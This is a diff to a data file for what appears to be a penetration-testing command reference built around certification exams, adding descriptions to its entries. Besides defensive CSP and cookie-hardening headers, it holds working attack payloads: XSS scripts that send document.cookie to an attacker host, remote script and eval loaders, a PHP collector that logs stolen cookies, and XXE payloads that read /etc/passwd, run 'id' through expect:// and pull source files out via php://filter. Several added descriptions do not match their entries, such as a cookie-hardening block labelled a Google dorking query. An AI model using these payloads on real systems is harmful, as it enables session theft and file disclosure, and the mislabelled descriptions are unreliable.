+          "command": "# HTTP response headers to configure (nginx / Apache / Express):\n\n# Content Security Policy - restricts script sources:\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';\n# script-src 'self' = only scripts from same domain, no inline JS, no external JS\n# To allow a specific CDN:\nContent-Security-Policy: script-src 'self' https://cdn.example.com;\n\n# Prevent MIME type sniffing:\nX-Content-Type-Options: nosniff\n\n# Legacy XSS filter (IE/old Chrome - mostly superseded by CSP):\nX-XSS-Protection: 1; mode=block\n\n# Referrer policy:\nReferrer-Policy: strict-origin-when-cross-origin\n\n# Enforce HTTPS:\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n\n# Express.js (Helmet):\napp.use(helmet());  // sets all of the above automatically\n\n# nginx location block example:\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\";\nadd_header X-Content-Type-Options nosniff;",
+          "description": "CSP & Security Headers. See the command syntax for exact usage and parameters."
         },
         {
           "label": "Cookie Hardening",
-          "command": "# Cookie flags that limit XSS damage:\n\n# HttpOnly - prevents document.cookie access from JavaScript:\nSet-Cookie: session=abc123; HttpOnly\n# XSS can no longer steal this cookie with document.cookie\n\n# Secure - cookie only sent over HTTPS:\nSet-Cookie: session=abc123; Secure\n\n# SameSite - limits cross-site request forgery:\nSet-Cookie: session=abc123; SameSite=Lax    # safe default\nSet-Cookie: session=abc123; SameSite=Strict # strictest\n\n# All three together (recommended for session cookies):\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax\n\n# PHP:\nsetcookie('session', $value, [\n    'httponly' => true,\n    'secure'   => true,\n    'samesite' => 'Lax',\n    'path'     => '/'\n]);\n\n# Express.js:\nres.cookie('session', value, {\n    httpOnly: true,\n    secure:   true,\n    sameSite: 'lax'\n});"
+          "command": "# Cookie flags that limit XSS damage:\n\n# HttpOnly - prevents document.cookie access from JavaScript:\nSet-Cookie: session=abc123; HttpOnly\n# XSS can no longer steal this cookie with document.cookie\n\n# Secure - cookie only sent over HTTPS:\nSet-Cookie: session=abc123; Secure\n\n# SameSite - limits cross-site request forgery:\nSet-Cookie: session=abc123; SameSite=Lax    # safe default\nSet-Cookie: session=abc123; SameSite=Strict # strictest\n\n# All three together (recommended for session cookies):\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax\n\n# PHP:\nsetcookie('session', $value, [\n    'httponly' => true,\n    'secure'   => true,\n    'samesite' => 'Lax',\n    'path'     => '/'\n]);\n\n# Express.js:\nres.cookie('session', value, {\n    httpOnly: true,\n    secure:   true,\n    sameSite: 'lax'\n});",
+          "description": "Google dorking query for OSINT reconnaissance. Uses advanced search operators to find exposed documents, login pages, sensitive files, and information leaks indexed by search engines."
         }
       ],
       "notes": "XSS prevention has two layers: input side (validate/allowlist) and output side (encode before rendering). The output side is more reliable because it catches stored payloads injected through any path. Templating engines (Twig, Blade, Jinja2, React JSX) escape output by default - the danger is when you explicitly bypass them (e.g. dangerouslySetInnerHTML, |raw, |safe). CSP is defense-in-depth - it limits damage if XSS occurs but does not replace output encoding.",
@@ -174608,11 +175728,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Cookie-stealing payload",
-          "command": "<script>new Image().src='http://<ip>/log.php?c='+document.cookie</script>"
+          "command": "<script>new Image().src='http://<ip>/log.php?c='+document.cookie</script>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         },
         {
           "label": "Exfil via fetch()",
-          "command": "<script>fetch('http://<ip>/?c='+document.cookie)</script>"
+          "command": "<script>fetch('http://<ip>/?c='+document.cookie)</script>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         }
       ],
       "explain": "Attacker-side collector for stolen cookies.\nThe index.php below reads the c parameter sent by the cookie-stealer, URL-decodes and splits each cookie, and appends it with the victim IP to cookies.txt.\nindex.php: <?php if (isset($_GET['c'])) { $list = explode(\";\", $_GET['c']); foreach ($list as $key => $value) { $cookie = urldecode($value); $file = fopen(\"cookies.txt\", \"a+\"); fputs($file, \"Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\\n\"); fclose($file); } } ?>  -- Read stolen cookies with: cat cookies.txt, then replay them (xss-session-set-cookie)."
@@ -174694,23 +175816,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Bare src (no path)",
-          "command": "<script src=http://<lhost>></script>"
+          "command": "<script src=http://<lhost>></script>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         },
         {
           "label": "Blind-XSS field identifier",
-          "command": "<script src=http://<lhost>/<fieldname>></script>"
+          "command": "<script src=http://<lhost>/<fieldname>></script>",
+          "description": "Blind-XSS field identifier. See the command syntax for exact parameters and flags."
         },
         {
           "label": "jQuery getScript",
-          "command": "<script>$.getScript(\"http://<lhost>\")</script>"
+          "command": "<script>$.getScript(\"http://<lhost>\")</script>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         },
         {
           "label": "XHR eval loader",
-          "command": "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//<lhost>\");a.send();</script>"
+          "command": "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//<lhost>\");a.send();</script>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         },
         {
           "label": "javascript: createElement loader",
-          "command": "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://<lhost>\\';document.body.appendChild(a)')"
+          "command": "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://<lhost>\\';document.body.appendChild(a)')",
+          "description": "Javascript: createElement loader. See the command syntax for exact parameters and flags."
         }
       ],
       "exam": "exam-ok",
@@ -175003,11 +176130,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Steal cookie to your server",
-          "command": "<script>new Image().src='http://<attacker>/c?='+document.cookie</script>"
+          "command": "<script>new Image().src='http://<attacker>/c?='+document.cookie</script>",
+          "description": "Steal cookie to your server. See the command syntax for exact parameters and flags."
         },
         {
           "label": "fetch exfil",
-          "command": "<script>fetch('http://<attacker>/?c='+document.cookie)</script>"
+          "command": "<script>fetch('http://<attacker>/?c='+document.cookie)</script>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         }
       ],
       "steps": [
@@ -175796,11 +176925,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Read /etc/passwd",
-          "command": "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+          "command": "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+          "description": "XML External Entity (XXE) injection payload. Exploits XML parsers to read local files, perform SSRF, or achieve remote code execution."
         },
         {
           "label": "Parameter entity (bypass filters)",
-          "command": "<!DOCTYPE r [<!ENTITY % x SYSTEM \"file:///<file>\"> %x;]>"
+          "command": "<!DOCTYPE r [<!ENTITY % x SYSTEM \"file:///<file>\"> %x;]>",
+          "description": "Parameter entity (bypass filters). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -176033,7 +177164,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "expect wrapper (needs PHP expect ext)",
-          "command": "<!ENTITY company SYSTEM \"expect://id\">"
+          "command": "<!ENTITY company SYSTEM \"expect://id\">",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "When the PHP expect extension is loaded, the expect:// wrapper executes shell commands.:\n  <lhost>  your listener/attacker IP\n$IFS substitutes spaces inside the entity."
@@ -176235,7 +177367,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "base64 to exfil binary/PHP files",
-          "command": "<!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=<file>\">"
+          "command": "<!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=<file>\">",
+          "description": "Base64 to exfil binary/PHP files. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Uses the PHP filter wrapper to base64-encode a source file before it is returned, so PHP/XML special characters do not break parsing and the source (e.g. index.php, connection.php) is disclosed int...:\n  <file>  file path\nDecode the returned string with: echo '<b64>' | base64 -d."
@@ -176668,7 +177801,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 950,
-  "buildDate": "2026-10-04T14:08:14.779Z",
+  "buildDate": "2026-10-06T21:49:19.760Z",
   "certifications": [
     "CDSA",
     "CPTS",
